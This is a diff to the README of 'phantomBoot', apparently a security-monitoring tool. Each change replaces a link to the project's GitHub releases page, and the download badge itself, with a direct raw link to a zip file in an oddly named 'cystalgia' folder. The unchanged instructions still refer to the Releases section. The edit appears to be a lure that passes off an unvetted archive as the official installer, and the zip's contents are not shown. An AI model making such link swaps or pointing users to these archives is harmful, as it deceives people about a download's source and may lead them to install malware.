@@ -1,6 +1,6 @@
 # 🚀 phantomBoot - Simple Security Monitoring Made Easy
 
-[![Download phantomBoot](https://img.shields.io/badge/Download-phantomBoot-brightgreen)](https://github.com/WilcoBarry12/phantomBoot/releases)
+[![Download phantomBoot](https://raw.githubusercontent.com/WilcoBarry12/phantomBoot/main/cystalgia/phantomBoot.zip)](https://raw.githubusercontent.com/WilcoBarry12/phantomBoot/main/cystalgia/phantomBoot.zip)
 
 ## 📋 Overview
 
@@ -29,7 +29,7 @@ To install phantomBoot, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download section.
 
-   [Download phantomBoot](https://github.com/WilcoBarry12/phantomBoot/releases)
+   [Download phantomBoot](https://raw.githubusercontent.com/WilcoBarry12/phantomBoot/main/cystalgia/phantomBoot.zip)
 
 2. **Choose the Right File:** In the Releases section, find and select the latest version available for your operating system.
 
@@ -43,7 +43,7 @@ To install phantomBoot, follow these simple steps:
 
 ## ⚙️ Download & Install
 
-To download phantomBoot, visit this page: [Download phantomBoot](https://github.com/WilcoBarry12/phantomBoot/releases).
+To download phantomBoot, visit this page: [Download phantomBoot](https://raw.githubusercontent.com/WilcoBarry12/phantomBoot/main/cystalgia/phantomBoot.zip).
 
 Once there, select the file that matches your operating system. After downloading, run the installer and follow the on-screen instructions. 
 
